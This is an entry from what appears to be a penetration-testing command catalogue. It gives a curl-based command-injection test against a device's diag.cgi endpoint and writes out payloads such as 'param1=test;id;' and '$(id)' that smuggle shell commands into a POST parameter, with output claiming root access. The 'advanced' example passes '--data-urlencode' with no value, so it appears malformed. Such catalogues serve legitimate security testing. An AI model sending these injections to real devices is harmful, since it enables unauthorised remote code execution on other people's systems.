---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -b cookies.txt -X POST http://<device-ip>/diag.cgi -d "param1=test;id;"
  -v
tags:
  - injection
  - testing
type: command
output: uid=0(root) gid=0(root) groups=0(root)
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:44.507Z'
verified: false
validated: true
submitted: true
---
# curl-inject-test

## Command

```bash
curl -b cookies.txt -X POST http://<device-ip>/diag.cgi -d "param1=test;id;" -v
```

## Description

Tests for command injection by appending a shell command to a vulnerable HTTP parameter, executing 'id' to confirm RCE in root context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Session cookies | Yes |
| `-X POST` | HTTP method | Yes |
| `http://<device-ip>/diag.cgi` | Vulnerable endpoint | Yes |
| `-d "param1=test;id;"` | Injected payload | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl -b cookies.txt -X POST http://192.168.1.1/diag.cgi -d "cmd=ping;id;"
```

### Advanced Usage

```bash
curl -b cookies.txt -X POST http://192.168.1.1/diag.cgi -d "param1=$(id)" --data-urlencode
```

## Expected Output

Response body contains output of 'id' command, such as user and group IDs, confirming injection.

## Related

- [[Related Procedure]]
